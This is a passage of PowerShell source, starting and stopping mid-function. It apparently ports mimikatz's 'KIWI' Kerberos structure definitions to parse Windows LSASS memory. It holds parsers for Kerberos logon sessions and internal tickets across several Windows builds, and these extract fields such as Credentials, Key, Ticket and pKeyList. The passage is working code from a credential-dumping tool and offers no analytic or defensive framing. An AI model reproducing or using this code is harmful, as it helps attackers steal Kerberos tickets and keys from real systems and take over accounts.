		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_1"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk27"] = $Struct["Value"]
		$StructToWrite["Tickets_2"] = @{}
		$StructToWrite["Tickets_2"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_2"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_2"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk28"] = $Struct["Value"]
		$StructToWrite["Tickets_3"] = @{}
		$StructToWrite["Tickets_3"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_3"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_3"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk29"] = $Struct["Value"]
		$StructToWrite["SmartcardInfos"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KIWI_KERBEROS_LOGON_SESSION_10($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["UsageCount"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk0"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Unk0"]
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1b"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk2"] = $Struct["Value"]
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $Struct
		$StructToWrite["LocallyUniqueIdentifier"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk7"] = $Struct["Value"]
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8b"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk9"] = $Struct["Value"]
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Credentials"] = @{}
		KIWI_KERBEROS_10_PRIMARY_CREDENTIAL $Buff $StructToWrite["Credentials"] $BaseAddr ([ref]$Offset)
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk16"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk17"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk22"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk23"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk24"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk25"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["pKeyList"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk26"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Tickets_1"] = @{}
		$StructToWrite["Tickets_1"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_1"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_1"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk27"] = $Struct["Value"]
		$StructToWrite["Tickets_2"] = @{}
		$StructToWrite["Tickets_2"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_2"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_2"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk28"] = $Struct["Value"]
		$StructToWrite["Tickets_3"] = @{}
		$StructToWrite["Tickets_3"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_3"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_3"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk29"] = $Struct["Value"]
		$StructToWrite["SmartcardInfos"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KIWI_KERBEROS_LOGON_SESSION_10_1607($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["UsageCount"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk0"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Unk0"]
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1b"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk2"] = $Struct["Value"]
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $Struct
		$StructToWrite["LocallyUniqueIdentifier"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk7"] = $Struct["Value"]
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8b"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk9"] = $Struct["Value"]
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset 8
		$StructToWrite["Credentials"] = @{}
		KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607 $Buff $StructToWrite["Credentials"] $BaseAddr ([ref]$Offset)
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk16"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk17"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk18"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk22"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk23"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["pKeyList"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk26"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Tickets_1"] = @{}
		$StructToWrite["Tickets_1"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_1"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_1"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk27"] = $Struct["Value"]
		$StructToWrite["Tickets_2"] = @{}
		$StructToWrite["Tickets_2"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_2"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_2"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk28"] = $Struct["Value"]
		$StructToWrite["Tickets_3"] = @{}
		$StructToWrite["Tickets_3"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_3"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_3"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk29"] = $Struct["Value"]
		$StructToWrite["SmartcardInfos"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KIWI_KERBEROS_LOGON_SESSION_10_1607_X86($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["UsageCount"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk0"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Unk0"]
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1b"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk2"] = $Struct["Value"]
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $Struct
		$StructToWrite["LocallyUniqueIdentifier"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk7"] = $Struct["Value"]
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8b"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk9"] = $Struct["Value"]
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["UnkAlign"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Credentials"] = @{}
		KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607 $Buff $StructToWrite["Credentials"] ($BaseAddr + $Offset)
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk16"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk17"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk18"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk22"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk23"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["pKeyList"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk26"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Tickets_1"] = @{}
		$StructToWrite["Tickets_1"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_1"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_1"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk27"] = $Struct["Value"]
		$StructToWrite["Tickets_2"] = @{}
		$StructToWrite["Tickets_2"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_2"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_2"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk28"] = $Struct["Value"]
		$StructToWrite["Tickets_3"] = @{}
		$StructToWrite["Tickets_3"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_3"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_3"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk29"] = $Struct["Value"]
		$StructToWrite["SmartcardInfos"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KERB_EXTERNAL_NAME($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["NameType"] = GetType $Buff $BaseAddr ([ref]$Offset) "Short"
		$StructToWrite["NameCount"] = GetType $Buff $BaseAddr ([ref]$Offset) "UShort"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Names"]
		For ($i = 0; $i -lt $StructToWrite["NameCount"]; $i += 1)
		{
			$Struct = @{}
			GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $Struct
			$StructToWrite["Names"] += ,($Struct)
		}

		return
	}

	function KIWI_KERBEROS_BUFFER($Buff, $StructToWrite, $BaseAddr, [ref]$Offset)
	{
		$StructToWrite["Length"] = GetType $Buff $BaseAddr $Offset "ULong"
		$Offset.Value = AlignAddress $BaseAddr ($Offset.Value)
		$StructToWrite["Value"] = GetType $Buff $BaseAddr $Offset "PVoid"
		$StructToWrite["Data"] = $Null

		return
	}

	function KIWI_KERBEROS_INTERNAL_TICKET_60($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["ServiceName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["TargetName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["DomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["DomainName"]
		$StructToWrite["TargetDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["TargetDomainName"]
		$StructToWrite["Description"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Description"]
		$StructToWrite["AltTargetDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["AltTargetDomainName"]
		$StructToWrite["ClientName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Name0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Tmp = ReadBuff $Buff 4 ([ref]$Offset)
		[Array]::Reverse($Tmp)
		$StructToWrite["TicketFlags"] = [System.BitConverter]::ToUint32($Tmp, 0)
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["KeyType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Key"] = @{}
		KIWI_KERBEROS_BUFFER $Buff $StructToWrite["Key"] $BaseAddr ([ref]$Offset)
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["StartTime"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["EndTime"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["RenewUntil"] = $Struct["Value"]
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Domain"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["StrangeNames"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["TicketEncType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["TicketKvno"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Ticket"] = @{}
		KIWI_KERBEROS_BUFFER $Buff $StructToWrite["Ticket"] $BaseAddr ([ref]$Offset)

		return
	}

	function KIWI_KERBEROS_INTERNAL_TICKET_6($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["ServiceName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["TargetName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["DomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["DomainName"]
		$StructToWrite["TargetDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["TargetDomainName"]
		$StructToWrite["Description"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Description"]
		$StructToWrite["AltTargetDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["AltTargetDomainName"]
		$StructToWrite["KDCServer"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["KDCServer"]
		$StructToWrite["ClientName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Name0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Tmp = ReadBuff $Buff 4 ([ref]$Offset)
		[Array]::Reverse($Tmp)
		$StructToWrite["TicketFlags"] = [System.BitConverter]::ToUint32($Tmp, 0)
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["KeyType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Key"] = @{}
		KIWI_KERBEROS_BUFFER $Buff $StructToWrite["Key"] $BaseAddr ([ref]$Offset)
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["StartTime"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["EndTime"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["RenewUntil"] = $Struct["Value"]
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Domain"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["StrangeNames"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["TicketEncType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["TicketKvno"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Ticket"] = @{}
		KIWI_KERBEROS_BUFFER $Buff $StructToWrite["Ticket"] $BaseAddr ([ref]$Offset)

		return
	}

	function KIWI_KERBEROS_INTERNAL_TICKET_10($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["ServiceName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["TargetName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["DomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["DomainName"]
		$StructToWrite["TargetDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["TargetDomainName"]
		$StructToWrite["Description"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Description"]
		$StructToWrite["AltTargetDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["AltTargetDomainName"]
		$StructToWrite["KDCServer"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["KDCServer"]
		$StructToWrite["Unk10586_d"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Unk10586_d"]
		$StructToWrite["ClientName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Name0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Tmp = ReadBuff $Buff 4 ([ref]$Offset)
		[Array]::Reverse($Tmp)
		$StructToWrite["TicketFlags"] = [System.BitConverter]::ToUint32($Tmp, 0)
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["KeyType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Key"] = @{}
		KIWI_KERBEROS_BUFFER $Buff $StructToWrite["Key"] $BaseAddr ([ref]$Offset)
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset 8
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["StartTime"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["EndTime"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["RenewUntil"] = $Struct["Value"]
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Domain"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["StrangeNames"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["TicketEncType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["TicketKvno"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Ticket"] = @{}
		KIWI_KERBEROS_BUFFER $Buff $StructToWrite["Ticket"] $BaseAddr ([ref]$Offset)

		return
	}

	function KIWI_KERBEROS_INTERNAL_TICKET_10_1607($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["ServiceName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["TargetName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["DomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["DomainName"]
		$StructToWrite["TargetDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["TargetDomainName"]
		$StructToWrite["Description"] = @{}
